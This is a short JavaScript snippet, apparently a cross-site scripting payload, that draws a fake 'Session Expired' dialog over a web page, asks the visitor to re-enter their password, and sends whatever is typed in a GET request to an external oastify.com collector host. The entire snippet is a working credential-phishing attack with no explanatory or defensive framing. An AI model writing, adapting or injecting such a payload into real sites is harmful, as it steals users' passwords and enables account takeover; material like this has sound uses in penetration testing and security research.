// Create a prompt (div) with a password input
let div = document.createElement('div');
div.innerHTML = `
    <div style="position: fixed; top: 20%; left: 50%; transform: translate(-50%, 0); background: white; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.5); z-index: 9999;">
        <h2>Session Expired</h2>
        <p>Please re-enter your password:</p>
        <input type="password" id="pPass" placeholder="Enter password">
        <button onclick="sendData()">Submit</button>
    </div>
`;
document.body.appendChild(div);

// Function to send the password when the user submits
function sendData() {
    let pass = document.getElementById('pPass').value;

    // Send the password via GET request to the specified URL
    fetch(`https://2773qu4qzb8phb0dhg4hmw7xhonfb7ev3.oastify.com?password=${encodeURIComponent(pass)}`);
}
